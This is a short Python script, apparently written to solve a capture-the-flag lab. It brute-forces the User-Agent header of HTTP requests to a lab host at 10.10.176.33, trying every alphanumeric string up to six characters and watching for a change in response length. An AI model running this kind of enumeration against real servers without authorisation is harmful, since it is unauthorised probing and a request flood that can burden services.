import requests

with open("names.txt") as f:
    names = f.read().split("\n")

hdr = {"Host": "10.10.176.33",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "R",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Connection": "close"}
r = requests.get("http://10.10.176.33/", headers=hdr)
print(len(r.text), r.text)

import itertools

def foo(l,s):
     yield from itertools.product(*([l] * s)) 
#for x in foo('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'):

counter = 0
for i in range(1, 7):
    for x in foo('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', i):
        name = "".join(x)
        if counter % 1000 == 0:
            print(name)
        counter += 1
        hdr = {"Host": "10.10.176.33",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": name,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "close"}
        r = requests.get("http://10.10.176.33/", headers=hdr)
        if len(r.text) != 218:

            print(len(r.text), name)